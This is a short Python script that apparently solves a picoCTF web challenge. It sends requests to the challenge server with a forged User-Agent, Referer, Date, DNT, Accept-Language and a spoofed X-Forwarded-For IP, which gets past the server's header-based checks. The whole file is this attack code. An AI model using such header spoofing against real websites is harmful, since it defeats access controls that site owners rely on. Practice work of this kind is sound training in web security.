url='http://mercury.picoctf.net:46199'
import requests
headers = {'User-Agent':'PicoBrowser'}

# r=requests.get(url,headers=headers)
# print(r.text)
# print('-------------------')
headers['Referer'] = url
# r=requests.get(url,cookies=cookies,headers=headers)
# print(r.text)
# print('-------------------')
headers['Date'] = '2018-01-07T08:37:42'
# r=requests.get(url,cookies=cookies,headers=headers)
# print(r.text)
# print('-------------------')
headers['DNT'] = '1'
# r=requests.get(url,cookies=cookies,headers=headers)
# print(r.text)
# print('-------------------')
headers['X-Forwarded-For'] = '102.177.147.254'
headers['Accept-Language'] = 'sv;q=0.9,en;q=0.8'
r=requests.get(url,headers=headers)
print(r.text)
print('-------------------')
